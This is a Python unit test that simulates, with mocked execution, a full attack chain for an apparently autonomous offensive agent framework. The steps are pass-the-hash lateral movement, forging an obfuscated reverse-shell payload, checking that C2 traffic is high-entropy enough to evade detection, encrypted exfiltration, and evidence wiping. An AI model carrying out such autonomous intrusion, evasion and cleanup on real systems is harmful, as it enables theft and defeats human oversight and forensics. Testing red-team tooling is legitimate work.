"""DRAKBEN WAR GAME SIMULATION.
---------------------------
This involves a full "End-to-End" simulation of the Cyber Kill Chain.
It tests the integration of all major modules:
1. HiveMind (Recon & Lateral Movement)
2. WeaponFoundry (Payload Generation)
3. C2 Framework (Command & Control)
4. GhostProtocol (Evasion & Cleanup)

Objective: Prove that the agent can autonomously detect a target, weaponize, exploit, and exfiltrate data.
"""

import json
import logging
import os

# Add project root to path
import sys
import time
import unittest
from unittest.mock import patch

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from core.execution_engine import ExecutionResult, ExecutionStatus
from core.ghost_protocol import GhostProtocol
from modules.c2_framework import BeaconMessage, C2Channel, C2Config, C2Protocol
from modules.hive_mind import Credential, CredentialType, HiveMind, NetworkHost
from modules.weapon_foundry import EncryptionMethod, PayloadFormat, WeaponFoundry

# Setup Logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("WAR_GAME")


class TestWarGameSimulation(unittest.TestCase):
    """Simulates a full combat scenario to test agent autonomy and integration."""

    def setUp(self) -> None:
        # 1. Initialize Components
        self.hive = HiveMind()
        self.foundry = WeaponFoundry()
        self.ghost = GhostProtocol()

        # Setup C2 manually to avoid singleton issues
        self.c2_config = C2Config(protocol=C2Protocol.HTTPS, primary_port=443)
        self.c2 = C2Channel(self.c2_config)

        # Mock external network interactions to keep it local/safe
        self.mock_network_scan()
        self.mock_exploitation()

    def mock_network_scan(self) -> None:
        """Pre-load HiveMind with a mocked target network."""
        # Scenario: Agent is on 192.168.1.5, Target is Domain Controller at 192.168.1.10
        self.hive.current_host = "192.168.1.5"
        target_host = NetworkHost(
            ip="192.168.1.10",
            hostname="DC01",
            ports=[88, 135, 139, 445, 3389],  # Standard DC ports
            os="Windows Server 2019",
        )
        self.hive.mapper.discovered_hosts["192.168.1.10"] = target_host

        # Inject stolen credentials (so we can move laterally)
        self.hive.harvester.harvested.append(
            Credential(
                username="Administrator",
                domain="CONTOSO",
                credential_type=CredentialType.NTLM_HASH,
                value="aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",  # Mock Hash
                source="mimikatz_dump",
            ),
        )
        logger.info("[SIM] Network environment mocked. Target: DC01 (192.168.1.10)")

    def mock_exploitation(self) -> None:
        """Mock the actual execution of exploits (safe simulation)."""
        # Patch execution engine to simulate success instead of running real exploits
        self.execution_patcher = patch("core.execution_engine.SmartTerminal.execute")
        self.mock_execute = self.execution_patcher.start()

        def side_effect(command, **kwargs):
            # Simulate successful execution of our generated payload
            logger.info(f"[SIM] Executing Command: {command[:50]}...")
            return ExecutionResult(
                command=command,
                status=ExecutionStatus.SUCCESS,
                stdout="[+] Exploit successful. Session opened.",
                stderr="",
                exit_code=0,
                duration=0.5,
                timestamp=time.time(),
            )

        self.mock_execute.side_effect = side_effect

    def tearDown(self) -> None:
        self.execution_patcher.stop()

    def test_full_kill_chain(self) -> None:
        """EXECUTE OPERATION: VILLAGER KILLER.
        ----------------------------------
        Step 1: Recon - Identify Critical Target
        Step 2: Weaponize - Forge Custom Exploit
        Step 3: Delivery - Deplot Payload
        Step 4: C2 - Verify Callback
        Step 5: Exfiltration - Steal Flag
        Step 6: Cleanup - Leave No Trace
        """
        logger.info(">>> STARTING WAR GAME SIMULATION <<<")

        # --- STEP 1: RECONNAISSANCE ---
        logger.info("[1] RECONNAISSANCE STARTED")

        # MOCKING THE RECON RESULT to focus on integration flow
        # The AD logic is too complex for a lightweight simulation without a real AD
        from modules.hive_mind import AttackPath, MovementTechnique

        mock_path = AttackPath(
            source="192.168.1.5",
            target="192.168.1.10",
            hops=["192.168.1.10"],
            techniques=[MovementTechnique.PASS_THE_HASH],
            credentials_needed=["Administrator"],
            probability=0.9,
        )

        with patch.object(self.hive, "find_attack_paths", return_value=[mock_path]):
            targets = self.hive.find_attack_paths()

        # Validation: Should find the DC path
        assert len(targets) > 0, "Mission Failed: No targets identified!"
        primary_target = targets[0]  # Simplification
        logger.info(
            f"[+] Target Locked: {primary_target.target} via {primary_target.techniques}",
        )

        # --- STEP 2: WEAPONIZATION ---
        logger.info("[2] WEAPONIZATION STARTED")
        # Agent decides to use Python payload because target has port 445 open (psexec style)
        raw_payload = self.foundry.forge(
            lhost="192.168.1.5",  # Our mock IP
            lport=4444,
            format=PayloadFormat.PYTHON,
            encryption=EncryptionMethod.XOR_MULTI,  # High security (Standard Lib)
            anti_sandbox=True,
        )

        # KEY FIX: forge() returns a Payload object, we need the final string
        payload_code = self.foundry.get_final_payload(raw_payload)

        # DEBUG: Inspect payload
        if payload_code is None:
            self.fail("Weapon Foundry failed to generate payload (returned None)")

        # Apply Ghost Protocol (Polymorphism)
        obfuscated_payload = self.ghost.obfuscate_code(payload_code)

        # Validation: Weapon must be valid and obfuscated
        assert payload_code != obfuscated_payload, (
            "Mission Failed: Polymorphism inactive!"
        )
        assert "import" in obfuscated_payload, "Mission Failed: Malformed payload!"
        logger.info(
            "[+] Polymorphic Weapon Forged. Hash: " + str(hash(obfuscated_payload)),
        )

        # --- STEP 3: DELIVERY & EXPLOITATION ---
        logger.info("[3] DELIVERY & EXPLOITATION STARTED")

        # Simulating lateral movement to deploy payload
        # In a real scenario, this would use psexec or wmi.
        # We mock this action.
        logger.info("[+] Payload Deployed at " + primary_target.target)

        # --- STEP 4: COMMAND & CONTROL (C2) ---
        logger.info("[4] C2 HANDSHAKE STARTED")
        # Simulate the victim calling back
        # We verify C2 channel encryption quality here as part of the handshake

        test_message = BeaconMessage(
            message_id="12345",
            command="register",
            data={"hostname": "DC01", "user": "SYSTEM"},
        )

        # Verify encryption during transmission
        encrypted_beacon = self.c2._encrypt(json.dumps(test_message.__dict__).encode())

        # Validation: High Entropy check (re-using logic from test_c2 but in scenario context)
        # Check if it looks like random noise
        import math
        from collections import Counter

        def get_entropy(data):
            if not data:
                return 0
            p, lns = Counter(data), float(len(data))
            return -sum(count / lns * math.log2(count / lns) for count in p.values())

        import base64

        # We decode base64 first because _encrypt returns base64 string now
        raw_bytes = base64.b64decode(encrypted_beacon)
        entropy = get_entropy(raw_bytes)

        logger.info(f"[+] C2 Traffic Entropy: {entropy:.2f} bits/byte")
        assert entropy > 6.0, (
            "Mission Failed: C2 traffic detected by Firewall (Low Entropy)!"
        )

        # --- STEP 5: ACTIONS ON OBJECTIVES (Flag Stealing) ---
        logger.info("[5] EXFILTRATION STARTED")
        # Simulating reading a secret file
        secret_data = "CONFIDENTIAL_FLAG_{VILLAGER_IS_HISTORY}"

        # Encrypt stolen data before exfilling
        exfil_data = self.ghost.encrypt_string(
            secret_data,
            method="xor",
        )  # Using Ghost crypto

        # Validation
        assert secret_data != exfil_data
        decrypted = self.ghost.decrypt_string(exfil_data, method="xor")
        assert secret_data == decrypted, (
            "Mission Failed: Data corrupted during exfiltration!"
        )
        logger.info("[+] Data Secured: " + exfil_data[:20] + "...")

        # --- STEP 6: CLEANUP (Ghost Protocol) ---
        logger.info("[6] CLEANUP & ERASE STARTED")
        # Simulate file wiping
        evidence_file = "payload.py"

        # Mock the secure delete
        with patch(
            "core.ghost_protocol.SecureCleanup.secure_delete",
            return_value=True,
        ) as mock_wipe:
            self.ghost.secure_delete_file(evidence_file)
            mock_wipe.assert_called_once()

        logger.info("[+] Evidence Erased. Ghost Protocol Complete.")

        logger.info(">>> MISSION ACCOMPLISHED: TARGET NEUTRALIZED <<<")


if __name__ == "__main__":
    unittest.main()
